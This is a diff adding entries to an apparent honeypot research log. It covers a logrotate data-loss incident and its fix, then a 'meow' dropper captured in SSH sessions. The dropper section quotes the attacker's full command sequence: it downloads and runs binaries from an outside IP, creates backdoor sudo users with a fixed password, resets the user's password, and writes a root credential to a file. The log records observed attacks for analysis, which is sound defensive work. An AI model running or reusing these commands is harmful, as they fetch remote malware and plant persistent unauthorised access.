@@ -829,3 +829,49 @@ Session c523e246ab55 looked like 38 minutes (today's log only). Pulled yesterday
 ### TODO: meow dropper (family 11) -- 2026-05-31
 
 New family appeared today. Downloads meow + meowarm64 from 34.11.111.237, creates backdoor sudo users (admin1, user1) with password modzmodz, changes current user password, writes root credential to /tmp/mew. Two hits, different trailing password (root:webserver vs root:fuck123) -- same C2, two operators or parameterized campaign. Analyse the binary and the /tmp/mew credential harvesting logic.
+
+---
+
+### logrotate incident + fix -- 2026-05-31 afternoon
+
+Weekly logrotate triggered at midnight UTC and rotated session.log. The honeypot kept
+writing to the new file (copytruncate, same fd), but server.log got wiped. The report
+showed only 12 hours of data instead of the full history.
+
+Recovery: full history was in session.log.1.gz on the VPS (pre-midnight chunk) + the
+live session.log (post-midnight). Also had the local pull at 00:47 Rabat which had the
+complete server.log with all restart history from May 26. Merged into full-merged/ and
+the full 121h dataset was intact.
+
+Fix: rewrote /etc/logrotate.d/ssh-honeypot -- daily rotation, 60 rotates, dateext
+(archives named session.log-2026-05-31.gz), delaycompress. Verified with --debug.
+Next rotation at midnight will produce dated archives, no more ambiguity.
+
+Lesson: always pull *.gz alongside *.log. The .gz has the pre-rotation history.
+
+---
+
+### family 11 (meow dropper) -- observed, not yet analysed
+
+Kill chain from session.log (two sessions, 01:09 and 01:12 UTC May 31):
+
+```
+cd /tmp; ulimit -n 1020000; rm -rf meow*
+wget http://34.11.111.237/meow; chmod 777 meow; ./meow
+wget http://34.11.111.237/meowarm64; chmod 777 meowarm64; ./meowarm64
+echo $(whoami):modzmodz | chpasswd
+useradd -m -s /bin/bash admin1; echo admin1:modzmodz | chpasswd; usermod -aG sudo admin1
+useradd -m -s /bin/bash user1;  echo user1:modzmodz | chpasswd
+echo -n 'root:webserver' > /tmp/mew   # second hit: root:fuck123
+```
+
+What I know from the logs: drops both x86 and ARM64 binaries (multi-arch, covers both
+without fingerprinting), creates two backdoor sudo users, changes the current user's
+password, writes a credential string to /tmp/mew. The /tmp/mew payload differs between
+the two hits -- probably parameterized per campaign or per operator.
+
+What I don't know yet: what meow and meowarm64 actually do (no binary analysis done),
+what /tmp/mew is used for (credential exfil? local storage?), who runs this campaign.
+
+TODO: download meow from 34.11.111.237 if still live, strings + file + readelf, check
+if C2 is on any blocklists.
